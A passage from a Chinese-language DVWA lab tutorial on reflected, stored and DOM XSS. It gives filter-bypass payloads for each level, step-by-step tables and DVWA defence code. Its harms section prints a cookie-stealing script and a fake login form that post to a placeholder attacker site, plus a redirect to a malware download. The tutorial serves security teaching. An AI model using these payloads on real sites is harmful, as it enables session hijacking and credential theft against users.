| 🟡 Medium | 切难度到 medium → Submit → 刷新 → 再进 Reflected XSS | 先拿 Low 的 `<script>alert(1)</script>` 试 → 应该失败！再按顺序试下面三个 payload，必中至少一个：<br>① **大小写绕过**：`<ScRipT>alert('XSS_Medium_CaseBypass')</ScRipT>`（DVWA Medium 用的 `str_replace('<script>' , '', $name)` 不递归 + 大小写敏感！）<br>② **双写绕过**：`<scr<script>ipt>alert('XSS_Medium_DoubleWrite')</scr<script>ipt>`（中间一个 `<script>` 被删掉，两边拼回 `<script>`）<br>③ **不用 script 标签**：`<img src=x onerror=alert(1)>` 或 `<svg onload=alert(document.domain)>` 任何事件属性 | 弹任意一个 alert = Medium 通关 ✅ | 【大小写/双写 全失败了？】→ ① 你 View Source 一下 Medium 源码是不是 `preg_replace('/<script/i', '', $name)`（有 i 修饰符 = 大小写不敏感！这种版本大小写和双写都直接废）→ 直接跳 ③ 不用 script 标签，img/svg/body 事件属性 100% 绕；② 你写成 `<scr<script>ipt>alert(1)</scr</script>ipt>`，闭合方式错了 → 严格写成 `<scr<script>ipt>...</scr<script>ipt>` 每侧多包 script 一次 |
| 🔴 High | 切难度到 high → Submit → 刷新 | Low 的 `<script>` 标签法 + Medium 的双写/大小写 6 个 payload **全失败才对 = High 生效**。然后测：<br>① **事件属性大法（99% 能过！）**：`<img src=x onerror=alert('XSS_High_OK')>` 或 `<body onpageshow=alert('HighOnPageshow')>` 或 `<details open ontoggle=alert('HighToggle')>` （这些全不带 "script" 这个单词，正则 `/<script.*>/i` 根本匹配不到）<br>② 备选：`<a href="javascript:alert('hrefJS')">点我</a>`（用户点一下才弹，也算 XSS） | 出现 alert 弹窗 = High 通关 ✅🎉 | 【img onerror 也不弹？】→ F12 Console 看报什么错：① "Uncaught ReferenceError: alert is not defined"？不可能 → 那是你浏览器有插件屏蔽了 alert → 换 `confirm(1)` 或 `prompt('xss')` 测；② 页面显示 Hello 后 HTML 源码里尖括号被转义成 `&lt;` 和 `&gt;` → 你那 DVWA 是 fork 版本用了 htmlspecialchars，High 级别是真的 Impassible 写法！（那你先记录问题，看源码里是 `htmlspecialchars()` + ENT_QUOTES = 真编码，这种纯靠输出编码没法绕的。原版 DVWA High 应该是只过滤 `<script.*>` 正则，没有对 `<>` 编码，事件属性一定能过）|

> 🔥 **反射型 XSS 查错总口诀（三级通用）：** 先拿 `<script>alert(1)</script>` 试看弹不弹 → 不弹就 F12 Elements 看渲染后的 HTML：**看到的尖括号还是 <> 就说明是"过滤标签"问题，换事件属性一定过；看到的已经是 &lt; 那就是被 htmlspecialchars 编码了，纯反射这条路基本走不通**。

---

### Impossible级别 - 几乎不可能攻破 ⚪

最后我们来看看Impossible级别，学习一下正确的防御姿势。

#### 源代码分析

```php
<?php

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $name = htmlspecialchars( $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

看到关键代码了吗？
```php
$name = htmlspecialchars( $_GET[ 'name' ] );
```

它用了`htmlspecialchars`函数！这个函数是干啥的呢？它会把HTML特殊字符转换成实体字符。

比如：
- `<` 变成 `&lt;`
- `>` 变成 `&gt;`
- `"` 变成 `&quot;`
- `'` 变成 `&#039;`

这样一来，你输入的`<script>`就会变成`&lt;script&gt;`，浏览器看到这个，就知道这是文本内容，不是标签，就不会执行了！

这才是正确的防御方法——输出编码！

你可以试试输入`<script>alert(1)</script>`，看看页面上显示的是什么。没错，就是原封不动的`<script>alert(1)</script>`文本，不会执行。

完美！这就是我们要学的防御方法，后面还会详细讲。

---

## 存储型XSS实战（Stored XSS）💾

好的，反射型XSS我们已经玩明白了，接下来看看更危险的存储型XSS！

在DVWA里选择"XSS (Stored)"模块，我们开始！

### Low级别 - 留言板的故事 🟢

先把安全级别调回Low。

#### 看看页面功能

存储型XSS的页面是一个留言板（Guestbook），有两个输入框：
- Name：你的名字
- Message：留言内容

填好之后点"Sign Guestbook"按钮，就能提交留言。提交后下面会显示所有历史留言。

这不就是我们开篇讲的公共留言板嘛！简直是XSS的温床啊！😈

#### 第一次尝试

我们来试试，在Message里输入：
```html
<script>alert('存储型XSS成功！')</script>
```

Name随便填一个，比如"测试者"，然后点提交。

哇！马上就弹窗了！🎉

而且更厉害的是——你刷新一下页面，它还弹窗！你关掉浏览器再打开，它还弹窗！

为啥？因为这段恶意代码已经被存到数据库里了！每次打开这个页面，都会从数据库里把留言读出来显示，然后每次都会执行！

这就是存储型XSS的可怕之处——一次注入，永久有效！所有访问这个页面的人都会中招！

对比一下反射型和存储型：
- 反射型：你得把恶意URL发给别人，别人点了才中招
- 存储型：啥都不用干，别人自己访问页面就中招

你说哪个危害大？显而易见嘛！😱

#### 源代码分析

我们来看看Low级别的源代码，分两部分：

**存储部分（把留言存进数据库）：**
```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = stripslashes( $message );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Sanitize name input
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>
```

看到了吗？虽然它用了`mysqli_real_escape_string`，但那是防SQL注入的，不是防XSS的！对于XSS来说，它完全没有过滤，用户输入啥就存啥。

**显示部分（把留言从数据库读出来显示）：**
```php
<?php
$query  = "SELECT name, comment FROM guestbook;";
$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

while( $row = mysqli_fetch_assoc( $result ) ) {
    //Get values from the result
    $name = $row["name"];
    $message = $row["comment"];

    //Adjust for
    echo "<div class=\"comment\"><p>{$name}</p><p>{$message}</p></div>";
}
?>
```

输出的时候也是直接输出，没有任何编码。所以XSS就这么发生了！

---

### Medium级别 - 有点防御但不够 🟡

好，调到Medium级别，我们继续。

#### 试试老办法

直接在Message里输入`<script>alert(1)</script>`，提交。

哎？没弹窗了。看看留言内容——script标签被删掉了！

和反射型的Medium一样，也是过滤了`<script>`标签。

#### 绕过方法

和反射型一样的思路：
- 大小写混合：`<SCRIPT>alert(1)</SCRIPT>`
- 用其他标签：`<img src=x onerror=alert(1)>`

来试试`<img>`标签那个，在Message里输入：
```html
<img src=x onerror=alert('存储型绕过成功！')>
```

提交！

成功！弹窗了！🎉

而且跟之前一样，刷新页面还会弹，因为存到数据库里了。

你看，存储型和反射型的绕过思路其实是一样的，只是一个存在URL里，一个存在数据库里。

#### 源代码分析

我们看看Medium级别的存储代码：

```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = str_replace( '<script>', '', $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>
```

哎？有意思！你看：
- `$message`用了`htmlspecialchars`，所以留言内容是安全的
- 但是`$name`只用了`str_replace('<script>', '', $name)`，只是过滤了script标签

那name字段是不是有问题？但是name输入框那么短，能输入多少东西呢？

嘿嘿，你忘了吗？前端的限制是可以绕过的！我们可以用Burp Suite抓包改包，或者直接修改HTML代码，让name输入框能输入更长的内容！

这就留给你自己去探索啦！💪

---

### High级别 - 更严格的过滤 🔴

High级别和反射型的High差不多，也是用正则过滤了script相关的内容。但是老规矩——我们还有其他标签！

用`<img src=x onerror=alert(1)>`试试看？应该也能成功！

思路都是一样的，就不重复啰嗦啦！你自己动手试试吧！🧪

### ✅ 表 11-2 · 存储型 XSS（Stored XSS）Low/Medium/High 三级通关速查 & 失败对照表

存储型是留言板 Guestbook，两个输入框：**Name（maxlength=10 前端长度限制，可抓包改 txtName）** + **Message（mtxMessage，长度通常不限）**。注意 High 以上还有 user_token（CSRF token），直接浏览器提交就行（表单自带），Burp 改要抓原请求把 token 带上。

| 难度 | 先干什么 | 输入框 / Burp 里填什么（**逐字抄！英文标点！**） | 看到什么算这级通过 ✅ | **失败了怎么办？（按报错抄作业）** ❌ |
|---|---|---|---|---|
| 🟢 Low | 切 low → Submit → 刷新 → XSS (Stored) Guestbook | **先搞 Message 输入框（最简单，完全没过滤！）**：<br>Message 里填：`<script>alert('Stored_XSS_Low_message!'+document.cookie)</script>` → Name 随便写（比如 test）→ Sign Guestbook 提交；<br>然后再测 **Name 输入框**：<br>Name 里填 `<img src=x onerror=alert('LowName')>`（10字符以内不超 maxlength，超了就 Burp 改）→ Message 随便写 → 提交 | ① 提交后立即弹窗 1 次；② 以后**每刷一次 Guestbook 页面就又弹 1 次**（因为 XSS 存进数据库了！每次读出来就执行，这就是存储型和反射型最大的区别！）= Low 通关 ✅ | 【提交了刷新不弹窗？】→ F12 → 切 Application → Cookies → 看 PHPSESSID 还在不在，登录过期了会跳登录页；【页面只显示脚本代码，没执行？】→ 你填的字段里有中文尖括号！换英文输入法 `<>` 重写；【点 Sign Guestbook 没反应】→ 前端 JS 校验 Name 必须填，Message 必须填，两个都写了 |
| 🟡 Medium | 切 medium → Submit → 刷新 → Guestbook → View Source 看过滤逻辑（message 被 strip_tags 或 htmlspecialchars？）| Medium 的经典坑 = **只过滤 Message，对 Name 字段几乎不设防（或者只做前端 maxlength）**，所以重点攻击 Name：<br>① Burp 抓包 → Intercept On → 浏览器里 Name 填 123，Message 填 456 → 点 Sign Guestbook → Burp 抓到 POST body，把 `txtName=123` 改成 → `txtName=<ScRipT>alert('MEDIUM_NAME_Bypass')</ScRipT>`（同时把 Content-Length 改大！不然会截断）→ Forward<br>② 如果 Name 也被正则过滤了，直接写事件属性：`txtName=<img src=x onerror=alert(1)>`（只有 29 字符，也短） | 提交后 Guestbook 再次弹窗，**且每次刷新都弹** = Medium 通关 ✅ | 【Burp Forward 后 Name 还是 123？】→ ① 你没改 Content-Length！改了 txtName 值的长度，Content-Length 也要对应改（比如 123 是 3 个字符，改成 `<ScRipT>alert(1)</ScRipT>` 是 30 字符，比原来多 27，Content-Length 就加 27）；② 或者用 Repeater Send 更省事（Send 时不需要手动算 Content-Length，Burp Repeater 会重算）；【Chrome 报 "XSS Auditor refused to execute script"】→ 换 Firefox，或者用 img onerror 这种不被 Auditor 拦的 payload |
| 🔴 High | 切 high → Submit → 刷新 → Guestbook | Low/Medium 那 6 个 payload 现在全失败才对（High 对 name+message 都做了 `<script.*>` 正则过滤）。然后用**事件属性 + 攻击两个字段组合**：<br>① **攻击 Name 字段 + svg onload**（29字符刚好！maxlength 10 的版本会被拦 → 这时 Burp 改 txtName 突破 maxlength）：Name（Burp 改）→ `<svg onload=alert(1)>`（不要双引号，就 20 多字符）<br>② **攻击 Message 字段 + details toggle**：Message 填 `<details open ontoggle=alert('HighToggle')>` （都不带 "script" 单词）<br>③ 备选：`<a href="javascript:alert(document.domain)" target=_blank>看我看我</a>`（用户点一下才弹，也是存储型） | 任何一个字段注入成功、刷新 Guestbook 能重复弹窗 = High 通关 ✅🎉 | 【F12 Elements 看尖括号都变成了 &lt; / &gt; = htmlspecialchars ENT_QUOTES】→ 原版 DVWA High 应该不会全编码。你的版本是高难度 fork（比如加了 htmlspecialchars），那存储型这级没法纯输出绕；【我明明提交成功了但是再回来看留言没存上？】→ 数据库字段长度限制！Name 字段有的版本 SQL 定义是 `varchar(15)`，你填了 50 字符 = 被 SQL 截断了根本没存进去，找 Burp Repeater 里改个短点的 payload：`<p onmousemove=alert(1)>HOVER`（只有 30 字符左右，鼠标移过去才弹，也算 XSS）|

> 💡 **存储型 XSS 查错总口诀：** 先 Message 简单的来 → 不行就转攻 Name（90% DVWA Medium 都是 Name 没防好）→ Name 被 maxlength 限制就 Burp 抓包改 txtName + 别忘了 Content-Length → 都不行就上 img/svg/details 事件属性。**每次都要刷新 Guestbook 再弹一次才算存储成功！只弹一次=其实是反射型！**

---

### Impossible级别 - 正确的防御 ⚪

来看看Impossible级别的代码，学习正确姿势：

```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = stripslashes( $message );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = stripslashes( $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $name = htmlspecialchars( $name );

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

看到了吗？不管是`$message`还是`$name`，都用了`htmlspecialchars`函数来处理！

这就对了！输出的时候都做HTML实体编码，不管你输入什么，都只会当成文本显示，不会被当成HTML标签执行。

完美的防御！👍

---

## DOM型XSS实战（DOM Based XSS）🌲

好的，最后我们来看看最特殊的一种——DOM型XSS！

在DVWA里选择"XSS (DOM)"模块，我们开始！

### 什么是DOM型XSS？

在开始之前，我们先回顾一下DOM型XSS的特点：**不经过服务器，完全在浏览器端发生。**

啥意思呢？就是说，整个漏洞的产生过程，服务器根本没参与。是网页里的JavaScript代码自己"作"出来的。

举个例子：网页里有一段JS代码，它会读取URL里的某个参数，然后把这个参数的值直接写到页面上。这个过程完全是浏览器在干，服务器只是把JS代码发给你而已，至于JS代码怎么运行，服务器不管也不知道。

如果攻击者在URL的那个参数里放了恶意代码，JS代码把恶意代码写到页面上，XSS就发生了！

因为恶意代码从来没传到服务器上（或者传了但服务器没动它），所以叫DOM型——完全是DOM操作导致的。

### Low级别 - 最简单的DOM XSS 🟢

先调到Low级别，进入DOM型XSS的页面。

#### 看看页面功能

页面上有个下拉选择框，写着"Please choose your language"（请选择你的语言），有English、French、German、Spanish几个选项。

选一个语言，点Select按钮，页面就会显示你选的语言。

同时你注意一下URL的变化——选了之后URL后面会多一个`?default=English`这样的参数。

#### 发现漏洞

我们来试试，直接在URL里修改`default`参数的值。比如把URL改成：

```
.../vulnerabilities/xss_d/?default=<script>alert(1)</script>
```

然后回车访问！

哇！弹窗了！🎉 DOM型XSS成功！

#### 为啥会这样？源代码分析

我们来看看页面的源代码（注意，是HTML源代码，不是PHP的）：

```html
<div class="vulnerable_code_area">
 
<p>Please choose a language:</p>

<form name="XSS" method="GET">
	<select name="default">
		<script>
			if (document.location.href.indexOf("default=") >= 0) {
				var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
				document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
				document.write("<option value='' disabled='disabled'>----</option>");
			}
			    
			document.write("<option value='English'>English</option>");
			document.write("<option value='French'>French</option>");
			document.write("<option value='Spanish'>Spanish</option>");
			document.write("<option value='German'>German</option>");
		</script>
	</select>
	<input type="submit" value="Select" />
</form>
```

看到那段JavaScript代码了吗？关键是这几句：

```javascript
var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
```

翻译成人话就是：
1. 从URL里找到`default=`后面的内容，存到变量`lang`里
2. 用`document.write`把`lang`的值写到页面上

你看！它直接把URL里的内容取出来，就直接写到页面里了！完全没检查有没有问题！

而且整个过程都是在浏览器里执行的，服务器根本不知道发生了什么——服务器只是把这段JS代码发给你而已。

这就是典型的DOM型XSS！💡

---

### Medium级别 - 开始防御 🟡

好，调到Medium级别，我们来看看。

#### 试试老办法

还是在URL里输入`<script>alert(1)</script>`，回车。

哎？没弹窗了。页面上显示的是English，好像参数被改掉了？

我们来看看Medium级别的源代码（还是看前端JS和后端PHP）。

#### 源代码分析

先看看后端PHP代码：
```php
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
    $default = $_GET['default'];
    
    # Do not allow script tags
    if (stripos ($default, "<script") !== false) {
        header ("location: ?default=English");
        exit;
    }
}

?>
```

哦！后端做了检查——如果`default`参数里包含`<script`（不区分大小写），就直接重定向回`default=English`。

那怎么办呢？后端过滤了script标签，但是DOM型XSS是前端的问题啊……等等，后端直接不让带script的请求通过，那我们就不用script标签呗！

但是等等，还有个问题——我们的输出位置是在`<option>`标签里面的：
```html
<option value='...'>输出在这里</option>
```

如果我们用`<img>`标签，它会在option里面，能执行吗？

试试就知道了！把URL改成：
```
.../vulnerabilities/xss_d/?default=<img src=x onerror=alert(1)>
```

回车……好像不行？页面没反应。

为啥呢？因为`<option>`标签里面不能放其他HTML标签，浏览器会忽略掉。

那怎么办？我们得先把`</option>`标签闭合了，再写我们的代码！

来试试这个：
```
.../vulnerabilities/xss_d/?default=</option><img src=x onerror=alert(1)>
```

解释一下：
- `</option>` - 先把option标签闭合
- `<img src=x onerror=alert(1)>` - 然后再写我们的img标签

这样img标签就不在option里面了，就能正常执行了！

回车访问！

成功！弹窗了！🎉

你看，DOM型XSS也需要考虑输出的位置，选择合适的payload。

---

### High级别 - 更严格的检查 🔴

High级别又加了什么防御呢？我们直接来看看源代码：

```php
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {

    # White list the allowable languages
    switch ($_GET['default']) {
        case "French":
        case "English":
        case "German":
        case "Spanish":
            # ok
            break;
        default:
            header ("location: ?default=English");
            exit;
    }
}

?>
```

哇！这次用了白名单！只有French、English、German、Spanish这四个值才被允许，其他的统统重定向。

这……这怎么办？白名单好像很严啊？

别急！别忘了，这是DOM型XSS！后端检查的是URL里的参数，但是——URL里还有个东西叫"锚点"（就是`#`后面的内容）！

锚点有个特点：**它不会被发送到服务器端！** 浏览器在发送请求的时候，会把`#`后面的内容去掉，不会传给服务器。

但是！JavaScript是可以获取到锚点内容的！

那我们是不是可以把恶意代码放到`#`后面？这样服务器看不到，也不会检查，但是前端JS说不定能拿到？

等等，我们再回去看看Low级别的那段JS代码：

```javascript
var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
```

它是从`document.location.href`里取值的，也就是完整的URL，包括锚点部分！

那我们来构造一个URL：
```
.../vulnerabilities/xss_d/?default=English#<script>alert(1)</script>
```

等等，但是这样的话，`default=`后面是`English#<script>alert(1)</script>`，对吗？因为`indexOf("default=")`找到的是第一个default=的位置。

但是后端检查的是`$_GET['default']`，也就是URL参数里的default，它的值是`English`，因为`#`后面的内容不会传到服务器。所以后端检查通过了！

然后到了前端，JS代码从完整URL里取`default=`后面的内容，就会取到`English#<script>alert(1)</script>`，然后写到页面上……

但是等等，里面有个`#`，还有script标签，能执行吗？

High级别下，前端的JS代码有没有变化？我们来看看。

……

其实这个思路是对的！利用锚点（`#`）来绕过服务端的检查，因为锚点内容不会发到服务器。具体怎么构造payload，就留给你自己去研究啦！这可是个很好的练习机会！💪

> 💡 提示：你需要仔细看JS代码是怎么处理URL的，然后想办法让你的恶意代码被取到并且执行。多试试不同的构造方式，你一定能成功的！

### ✅ 表 11-3 · DOM 型 XSS（DOM-Based XSS）Low/Medium/High 三级通关速查 & 失败对照表

DOM 型 XSS 不经过服务端存储也不经过服务端反射处理后直接输出（纯前端 JS 自己取 `location.href` / `document.URL` 拼到 `innerHTML` 里！），所以：① F12 → Network 标签看不到 payload 发给服务器（服务端日志里也不会留下 payload 痕迹！这就是 DOM 型独特之处 = 服务端 WAF 完全看不见）；② 主要攻击入口是 GET 参数 `?default=`（前端 `<select>` 下拉框"选择语言"那个值，通过 URL 参数回显）。

| 难度 | 先干什么 | URL 里写什么 / 改什么（**逐字抄，浏览器地址栏里直接敲**） | 看到什么算这级通过 ✅ | **失败了怎么办？（按报错抄作业）** ❌ |
|---|---|---|---|---|
| 🟢 Low | 切 low → Submit → 刷新 → XSS (DOM) | 浏览器地址栏里直接把 URL 末尾改成：<br>`?default=<script>alert('DOM_Low_OK')</script>` → 回车 | ① 页面直接弹窗 alert('DOM_Low_OK')；② F12 → Network 里**看不到 `<script>` 这个字符串出现在请求体里**（说明全在客户端拼的，服务端根本没收到 = DOM 型确认）✅ | 【没弹窗 / 下拉框选择的是 "English" 没变？】→ ① 你改的参数名错了，不是 `?lang=` 不是 `?lan=`，参数名一定是 `default=`！去 F12 Elements 搜 `document.URL` 或者 `?default=` 相关 JS 代码确认；② 有的版本默认文件是 index.php，URL 结尾必须是 `index.php?default=...` 不能光写目录；③ Chrome XSS Auditor 拦了 → 换成 `?default=<svg onload=alert(1)>` 或 Firefox |
| 🟡 Medium | 切 medium → Submit → 刷新 → DOM XSS | Low 的 `<script>alert(1)</script>` 现在应该没反应。先 View Source / F12 Console 看过滤方式（通常是 `str_replace('<script>' , '' , $_GET['default'])` 不区分大小写的话大小写绕过，区分大小写的话双写绕过；或者正则 `/<script/i` 大小写不敏感直接废 script 标签）→ 按顺序测，必中：<br>① 大小写：`?default=<ScRiPt>alert('DOM_Med_Case')</ScRiPt>`<br>② 双写：`?default=<scr<script>ipt>alert('DOM_Med_DoubleWrite')</scr<script>ipt>`<br>③ script 被废就用事件：`?default=<svg onload=alert('DOM_Med_Svg')>` 或 `<img src=x onerror=alert(1)>`<br>④ 还不弹窗就用 select 选项：`?default=English></option><img src=x onerror=alert('MED_CloseOption')>`（把前一个 option 闭合，后面插入 img）| 任意一个 alert 弹出来 = Medium 通关 ✅ | 【3 个都不弹？F12 Elements 里找一下被塞进 innerHTML 那段代码】→ 你写的标签被 HTML 实体化了？DOM 型理论上不会啊 → 哦，前端 JS 用了 `textContent` 而不是 `innerHTML`？那就不是 DOM XSS 了，你切错靶场了 → 回 DVWA 主菜单确认点的是 XSS (DOM) 不是别的；【下拉框那行出现了标签但没执行 = F12 Elements 里能看到 `<svg onload=...>` 但就是不执行】→ SVG/IMG/DETAILS 事件属性都要求该元素真的被加入 DOM 树。如果 `innerHTML` 是把整个字符串塞进 option value 里的话，那得先闭合 option 标签！→ 用第 ④ 个 payload（`English></option>...`）先跳出来 |
| 🔴 High | 切 high → Submit → 刷新 | 所有 Low/Medium 的 `<script>` / `ScRiPt` / `双写` / `<img...>` 直接写在 `?default=` 里现在都失败才对。**High 级别核心技巧：服务端对 `?default=` 做白名单（只能是 English / Spanish / German / French 中的一个），所以我们不能把 payload 写在 ? 后面（query string 会被服务端校验），但是可以写在 URL 锚点 `#` 后面！因为 URL 中 `#` 号开始的 fragment（锚点部分）** 绝对不会发给服务端**，前端 JS 里 `document.URL` 却可以读到完整 URL（包括 #xxx）** — 经典绕过法：<br>URL 改成：<br>`?default=English#<script>alert('DOM_HashBypass')</script>`<br>（?default=English 是给服务端校验的白名单值，# 后面的 payload 服务端完全看不到！直接进前端 JS 拼 DOM）<br>如果 script 也被前端正则过滤了，再试组合：<br>`?default=French#<svg onload=alert('DOM_High_Hash_SVG')>` | ① Network 里服务端请求只有 `default=English`，**`<script>` 那段在请求里完全看不到**（证明真的没出网络）；② 浏览器弹 DOM_HashBypass/DOM_High_Hash_SVG 的 alert = High 通关！🎉 | 【加了 # 也不弹？】→ 先去读前端 JS 源码里究竟取的是哪部分：F12 → Elements → Ctrl+F 搜 `location.hash`、`document.URL`、`location.href`、`split("?")`、`decodeURIComponent`：① 如果 JS 取的是 `location.search.split('default=')[1]`（只会取到 ? 后的 query，不含 #！）→ 那 High 这级的过滤逻辑换了，直接换 DOM Clobbering；② 如果 JS 用了 `decodeURIComponent()` 你 payload 里的 `#` 被 URL 编码成 `%23` 了 → 不要手动编码，直接用浏览器地址栏输入字符 `#`，不要用 Burp 改；③ `SameSite=Lax` 无关（DOM XSS 不依赖跨站 cookie），这个问题不影响；【我就想证明这是 DOM 型 = 怎么对比三种 XSS 差异】→ 打开 Wireshark 抓回环包，反射/存储的 payload 都能在 HTTP 请求里抓到；**DOM 型 High 用 # 后的 payload，Wireshark 里请求只有 ?default=English，任何 XSS 代码全看不到 = DOM 型特征实锤！** |

> 🏴‍☠️ **DOM XSS 查错总口诀：** 参数名一定是 `default=`（不是 lang 不是 language）→ Low 直接 `<script>` → Medium 用 SVG/IMG 事件属性或双写/大小写 → High 白名单就把 payload 全塞到 `#` 后面（fragment 不进请求）。**F12 Network 里看不到任何 `<script>` 字符的请求体，那就是 DOM XSS 没错了！**

---

### Impossible级别 - 防御DOM XSS ⚪

DOM型XSS怎么防御呢？其实思路和其他XSS一样——不要相信任何外部输入，输出到页面的时候要做编码！

对于DOM型XSS来说，就是前端JavaScript代码在把内容插入到DOM之前，要先做HTML编码，或者用安全的方式来操作DOM（比如用textContent而不是innerHTML）。

具体的我们放到防御部分一起讲！

---

## XSS能做什么？（危害篇）⚠️

好了，三种XSS我们都实战过了。你可能会说："不就是弹个窗吗？有啥大不了的？"

那你可太小看XSS了！弹窗只是最简单的测试。真正的XSS攻击能做的事情多着呢！下面我们就来聊聊XSS的危害。

### 1. 偷取Cookie 🍪（最常见）

这是XSS最经典的用法了！

你登录一个网站后，网站会给你发一个Cookie，里面存着你的登录状态。以后你再访问这个网站，浏览器就会自动带上这个Cookie，网站就知道你是谁了。

如果网站有XSS漏洞，攻击者就可以注入恶意代码，偷偷把你的Cookie偷走！

比如注入这样的代码：
```javascript
<script>
    new Image().src = 'http://攻击者的网站/steal.php?cookie=' + document.cookie;
</script>
```

这段代码干了啥呢？
- 创建了一个图片对象
- 把图片地址设为攻击者的网站，同时把你的Cookie当参数传过去
- 浏览器会尝试加载这个图片，于是你的Cookie就被发送到攻击者的服务器了！

攻击者拿到你的Cookie之后，就可以把你的Cookie设置到他自己的浏览器里，然后冒充你登录你的账号！这就叫"Cookie劫持"或者"会话劫持"。

想象一下，如果是你的支付宝、微信、网银账号被偷了Cookie……后果不堪设想！😱

### 2. 钓鱼攻击 🎣

XSS还可以用来钓鱼。什么是钓鱼呢？就是伪造一个假的登录框，骗你输入用户名密码。

比如攻击者注入这样的代码：
```javascript
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;">
    <h2>您的登录已过期，请重新登录</h2>
    <form action="http://攻击者的网站/phish.php">
        用户名：<input type="text" name="username"><br>
        密码：<input type="password" name="password"><br>
        <input type="submit" value="登录">
    </form>
</div>
```

这段代码会在页面上盖一个全屏的层，显示一个假的登录框，跟真的一模一样。用户一看"哦，登录过期了"，就傻乎乎地输入了用户名密码。

一点登录，信息就发到攻击者那里去了！

这种钓鱼方式比普通的钓鱼网站更难防备，因为它是出现在真实的网站上的！用户一看网址是对的，就放下戒心了。

### 3. 挂马 🐴

挂马就是在网页里植入木马病毒，用户访问了就会中毒。

通过XSS，攻击者可以注入代码，让浏览器偷偷下载并运行病毒程序。或者把用户重定向到挂马的网站。

比如：
```javascript
<script>
    window.location = 'http://malicious-site.com/virus.exe';
</script>
```

当然，现在浏览器都有安全机制，不会随便下载运行文件。但是如果配合浏览器漏洞，还是很危险的。

### 4. 键盘记录 ⌨️

